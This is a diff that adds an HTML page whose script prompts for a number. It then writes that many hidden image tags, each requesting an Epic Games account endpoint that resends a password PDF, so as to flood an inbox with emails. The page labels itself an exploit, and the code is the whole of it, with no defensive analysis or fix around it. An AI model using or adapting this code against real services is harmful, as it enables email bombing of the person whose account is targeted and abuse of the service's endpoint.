@@ -1,0 +1,19 @@
+<h1>This page will flood your email inbox with the number of emails you specify</h1>
+
+
+
+
+
+<script>
+var x = prompt("please Enter the number of emails you want to recieve ", "0");
+var emails_num = parseInt(x);
+var i =0;
+for (i;i< emails_num ;i++){
+    
+    console.log(i);
+    document.write("<img src=https://www.epicgames.com/account/v2/retrieve-info/resend-pdf-password?" + i + " style='display: none;'>");
+    
+};
+document.write("<h1>exploit completed you will start recieving emails till recieve " + emails_num + " emails</h1>" );
+
+</script>
